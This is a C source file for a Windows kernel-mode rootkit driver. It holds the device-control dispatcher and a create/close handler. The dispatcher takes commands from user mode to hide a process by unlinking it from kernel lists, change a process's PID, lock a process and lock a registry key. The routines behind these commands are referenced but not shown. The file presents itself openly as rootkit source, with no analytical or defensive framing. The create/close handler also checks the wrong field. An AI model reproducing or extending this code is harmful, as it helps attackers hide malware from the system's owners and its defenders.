/*
 * ioctl.c
 *
 * Description: Implements IRP and driver object controls.
 */

#include "ioctl.h"

NTSTATUS nt_rootkit_create_close(PDEVICE_OBJECT dev_obj, PIRP irp)
{
        UNREFERENCED_PARAMETER(dev_obj);
        PIO_STACK_LOCATION io_stack = NULL;

        io_stack = IoGetCurrentIrpStackLocation(irp);

        switch (io_stack->Parameters.DeviceIoControl.IoControlCode) {
        case IRP_MJ_CREATE:
                DbgPrint("Handle to symlink opened");
                break;
        case IRP_MJ_CLOSE:
                DbgPrint("Handle to symlink closed");
                break;
        }

        irp->IoStatus.Information = 0;
        irp->IoStatus.Status = STATUS_SUCCESS;
        IoCompleteRequest(irp, IO_NO_INCREMENT);

        return STATUS_SUCCESS;
}

NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp) 
{
        UNREFERENCED_PARAMETER(dev_obj);
        PIO_STACK_LOCATION io_stack = NULL;
        
        io_stack = IoGetCurrentIrpStackLocation(irp);

        switch (io_stack->Parameters.DeviceIoControl.IoControlCode) {
        case IO_HIDE_PROC:
                proc_unlink((PUINT32)irp->AssociatedIrp.SystemBuffer);
                break;
        case IO_PID_PROC:
                proc_set_pid((PUINT32)irp->AssociatedIrp.SystemBuffer);
                break;
        case IO_LOCK_PROC:
                lock_proc((HANDLE)irp->AssociatedIrp.SystemBuffer);
                break;
        case IO_LOCK_KEY:
                lock_key((PUNICODE_STRING)irp->AssociatedIrp.SystemBuffer);
                break;
        }

        irp->IoStatus.Information = 0;
        irp->IoStatus.Status = STATUS_SUCCESS;
        IoCompleteRequest(irp, IO_NO_INCREMENT);

        return STATUS_SUCCESS;
}